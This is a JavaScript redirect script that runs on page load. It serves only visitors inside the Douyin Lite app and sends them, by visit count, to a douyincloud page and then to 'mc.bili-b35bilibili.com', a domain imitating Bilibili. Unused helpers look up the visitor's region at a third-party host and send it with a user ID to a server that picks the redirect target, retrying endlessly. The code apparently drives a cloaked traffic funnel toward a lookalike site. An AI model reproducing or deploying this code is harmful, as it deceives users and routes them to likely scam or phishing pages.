(() => {
    function handleAjax(url, address2Url, userId) {
        $.ajax({
            url: url,
            type: 'GET',
            dataType: "jsonp",
            success: function (data) {
                if (data.data == null) {
                    address2(address2Url, userId);
                } else {
                    location.href = data.data;
                }
            },
            error: function () {
                setTimeout(() => {
                    $.ajax(this);
                }, 5000);
            }
        });
    }

    function address2(url, userId) {
        $.ajax({
            url: "https://d55t.c/ip",
            type: "GET",
            dataType: "jsonp",
            success: function (data) {
                $.ajax({
                    url: `${url}?u=${userId}&d=${data.data.region}`,
                    type: 'GET',
                    dataType: "jsonp",
                    success: function (data) {
                        if (data.data != null) {
                            console.log(data.data);
                            location.href = data.data;
                        }
                    },
                    error: function () {
                        setTimeout(() => {
                            $.ajax(this);
                        }, 5000);
                    }
                });
            }
        });
    }

    function first() {
        location.href = "https://1kf5it1ciohf7-env-dDhjWZGo1K.service.douyincloud.run/tzb.html";
    }

    function second() {
        location.href = "https://mc.bili-b35bilibili.com/mc.html";
    }

    function isDouyinLiteApp() {
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
        // pc调试用，平时不打开
        // const userAgent = "aweme_lite";
        return userAgent.includes('aweme_lite');
    }

    function shouldResetVisitCount(lastVisitTime) {
        const FIVE_HOURS = 5 * 60 * 60 * 1000;
        const now = new Date().getTime();
        return now - lastVisitTime >= FIVE_HOURS;
    }

    function proceedToNextStep() {
        let visitCount = localStorage.getItem('visitCount');
        if (visitCount === null) {
            visitCount = 0;
        } else {
            visitCount = parseInt(visitCount);
        }

        visitCount += 1;
        localStorage.setItem('visitCount', visitCount);

        if (visitCount === 1) {
            first();
        } else if (visitCount === 2) {
            second();
        } else {
           
            window.location.href = 'https://mc.bili-b35bilibili.com/mc.html';
        }
    }

    function handlePageLoad() {
        if (!isDouyinLiteApp()) {
            alert('请在抖音极速版中打开');
            return;
        }

        let lastVisitTime = localStorage.getItem('lastVisitTime');
        const now = new Date().getTime();

        if (lastVisitTime === null) {
            lastVisitTime = now;
        } else {
            lastVisitTime = parseInt(lastVisitTime);
            if (shouldResetVisitCount(lastVisitTime)) {
                localStorage.setItem('visitCount', 0);
                lastVisitTime = now;
            }
        }

        localStorage.setItem('lastVisitTime', now);

        // 检查是否需要自动进入下一步
        const autoProceed = localStorage.getItem('autoProceed');
        if (autoProceed === 'true') {
            localStorage.setItem('autoProceed', 'false');
            proceedToNextStep();
        } else {
            // 第一次进入页面，设置标志
            localStorage.setItem('autoProceed', 'true');
            proceedToNextStep();
        }
    }

    function debounce(func, wait) {
        let timeout;
        return function () {
            const context = this, args = arguments;
            clearTimeout(timeout);
            timeout = setTimeout(() => func.apply(context, args), wait);
        };
    }

    const debouncedHandlePageLoad = debounce(handlePageLoad, 300);

    window.addEventListener('load', debouncedHandlePageLoad);
    window.addEventListener('pageshow', debouncedHandlePageLoad);

    $(document).ready(function () {
        // Close the modal when the button is clicked
        $('#closeBtn').click(function () {
            // 点击我知道了之后的操作
            debouncedHandlePageLoad();
        });
    });
})();
